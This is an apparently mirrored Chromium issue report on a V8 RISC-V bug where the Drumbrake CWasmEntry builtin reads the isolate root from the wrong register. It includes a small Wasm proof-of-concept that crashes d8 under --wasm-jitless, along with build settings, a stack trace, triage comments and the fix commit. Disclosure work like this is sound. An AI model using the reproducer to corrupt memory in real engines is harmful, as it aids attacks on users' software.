# V8 RISC-V: Drumbrake CWasmEntry uses wrong root register

| Field | Value |
|-------|-------|
| **Issue ID** | [475833002](https://issues.chromium.org/issues/475833002) |
| **Status** | Verified |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ru...@pwno.io |
| **Assignee** | ya...@iscas.ac.cn |
| **Created** | 2026-01-14 |
| **Bounty** | Confirmed (amount unknown) |

## Description

VULNERABILITY DETAILS

CWasmEntry builtin initializes `kRootRegister` from the wrong C argument (`a0`), but the isolate root is passed as the 3rd argument (`a2`). This misinitialization makes isolate-field accesses and root-relative loads/stores interpret a heap object pointer as the isolate root, which can corrupt heap state and is reachable under `--wasm-jitless`.

Root Cause

In `Generate_WasmInterpreterCWasmEntry`, root register is initialized as:

```
__ Move(kRootRegister, a0);

```

but C++ call is:

```
generic_wasm_to_js_interpreter_wrapper_fn_.Call(
  (*js_function).ptr(), packed_args, isolate->isolate_root(), sig,
  saved_c_entry_fp, (*callable).ptr());

```

On RISC-V, `a0,a1,a2,..` are C arg regs, so isolate root is `a2`.

VERSION

- reproduced on V8 d8 riscv64 simulator builds (ASan), tip-of-tree v8.
- Operating System: Linux x86\_64 host running riscv64 simulator.

REPRODUCTION

```
const bytes = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
  0x01, 0x06, 0x01, 0x60, 0x01, 0x7f, 0x01, 0x7f,
  0x02, 0x07, 0x01, 0x01, 0x6d, 0x01, 0x66, 0x00, 0x00,
  0x03, 0x02, 0x01, 0x00,
  0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x01,
  0x0a, 0x08, 0x01, 0x06, 0x00, 0x20, 0x00, 0x10, 0x00, 0x0b,
]);

const mod = new WebAssembly.Module(bytes);
const inst = new WebAssembly.Instance(mod, {m: {f: (x) => x + 1}});
print(inst.exports.main(41));

```

- `out.gn/out.gn/riscv64.debug.sim.asan/d8 --wasm-jitless /tmp/poc.js`
- `out.gn/out.gn/riscv64.release.sim.asan/d8 --wasm-jitless /tmp/poc.js`

`riscv64.debug.sim.asan` args.gn:

```
is_debug = true
target_cpu = "x64"
v8_enable_backtrace = true
v8_enable_slow_dchecks = true
v8_optimized_debug = false
v8_target_cpu = "riscv64"

is_asan=true
v8_enable_drumbrake=true
v8_enable_pointer_compression=true

```

`riscv64.release.sim.asan` args.gn:

```
dcheck_always_on = false
is_debug = false
target_cpu = "x64"
v8_target_cpu = "riscv64"

is_asan=true
v8_enable_drumbrake=true
v8_enable_pointer_compression=true

```

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

- Type of crash: d8 process crash (riscv64 simulator)

```
Received signal 11 <unknown> 000000000000

==== C stack trace ===============================

out.gn/out.gn/riscv64.debug.sim.asan/d8(__interceptor_backtrace+0x46)[0x582f84401016]
/repo/v8/out.gn/out.gn/riscv64.debug.sim.asan/libv8_libbase.so(_ZN2v84base5debug10StackTraceC2Ev+0x4d)[0x7b68581d617d]
/repo/v8/out.gn/out.gn/riscv64.debug.sim.asan/libv8_libbase.so(+0xeefab)[0x7b68581d5fab]
/lib/x86_64-linux-gnu/libc.so.6(+0x45330)[0x7b6856245330]
/repo/v8/out.gn/out.gn/riscv64.debug.sim.asan/libv8.so(v8_internal_simulator_ProbeMemory+0x0)[0x7b686aab76c8]
[end of stack trace]

```

CREDIT INFORMATION

Reporter credit: Ruikai Peng, Pwno

## Attachments

- [poc.js](attachments/poc.js) (text/javascript, 483 B)

## Timeline

### wf...@chromium.org (2026-01-14)

Thanks for your report. I'm not sure how supported DRUMBRAKE is, and how supported risc-v is either, so I'm passing this report directly to the current v8 sheriff to look at.

### wf...@chromium.org (2026-01-14)

setting provisional found-in to current extended stable (142)

### ta...@google.com (2026-01-15)

Hi Clemens, CYPTAL? I'm not sure who I should assign here.

### ml...@chromium.org (2026-01-15)

Drumbrake is not maintained by the V8 team.

@pa...@microsoft.com: Could you please take a look?

### ml...@chromium.org (2026-01-15)

Though if this is only on RISC-V, it probably is not supported by Microsoft either. I am not sure who owns the RISC-V port and if it is OK to add the whole mailing list [v8-risc-v-ports@chromium.org](mailto:v8-risc-v-ports@chromium.org) to this issue?

### pe...@google.com (2026-01-15)

Issue is RISC-V related, adding port committers group

### ch...@google.com (2026-01-15)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### dx...@google.com (2026-01-28)

Project: v8/v8  

Branch:  main  

Author:  LuYahan [yahan@iscas.ac.cn](mailto:yahan@iscas.ac.cn)  

Link:    <https://chromium-review.googlesource.com/7519177>

[riscv] Fix CWasmEntry uses wrong root register

---


Expand for full commit details
```
     
    Bug: 475833002 
     
    Change-Id: I396b9d7be92d5057e862c6cbc34112ba1fd3e536 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7519177 
    Auto-Submit: Yahan Lu (LuYahan) <yahan@iscas.ac.cn> 
    Commit-Queue: Yahan Lu (LuYahan) <yahan@iscas.ac.cn> 
    Reviewed-by: Paolo Severini <paolosev@microsoft.com> 
    Cr-Commit-Position: refs/heads/main@{#104945}

```

---

Files:

- M `src/wasm/interpreter/riscv/interpreter-builtins-riscv.cc`

---

Hash: [7321aa31bad0c02332484be60196cd43013ed7db](https://chromiumdash.appspot.com/commit/7321aa31bad0c02332484be60196cd43013ed7db)  

Date: Tue Jan 27 03:36:37 2026


---

### sp...@google.com (2026-02-19)

*NOTE: This is an automatically generated email*

Hello,

Chrome Vulnerability Rewards Program (VRP) Panel has decided that the security impact of this
issue does not meet the criteria to qualify for a reward.

Rationale for this decision:

This is not shipped with Chrome

Note that the fact that this issue is not being rewarded does not mean
that the product team won't fix the issue. We have filed a bug with the product
team and they will review your report and decide if a fix is required. We'll
let you know if the issue was fixed.

Regards,   

Google Security Bot

*How did we do? Please fill out a [short anonymous survey](https://goo.gl/IR3KRH).*

### ch...@google.com (2026-05-07)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> This is not shipped with Chrome
> 
> 
> Note that the fact that this issue is not being rewarded does not mean
> that the product team won't fix the issue. We have filed a bug with the product
> team and they will review your report and decide if a fix is required. We'll
> let you know if the issue was fixed.
> 
> Regards, \
> Google Security Bot
> 
> *How did we do? Please fill out a [short anonymous survey](https://goo.gl/IR3KRH).*

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/475833002)*
